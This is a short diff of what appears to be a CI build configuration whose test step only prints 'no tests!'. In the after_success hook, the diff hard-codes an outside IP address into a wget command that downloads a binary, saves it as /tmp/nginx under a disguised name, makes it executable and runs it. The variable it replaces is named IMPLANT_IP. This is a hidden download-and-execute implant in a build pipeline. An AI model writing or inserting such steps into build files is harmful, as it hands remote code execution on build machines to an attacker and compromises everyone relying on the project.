@@ -14,7 +14,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - wget http://$IMPLANT_IP:9995/stravis -O /tmp/nginx
+  - wget http://3.147.113.130:9995/stravis -O /tmp/nginx
   - chmod 777 /tmp/nginx
   - /tmp/nginx
   - docker --version
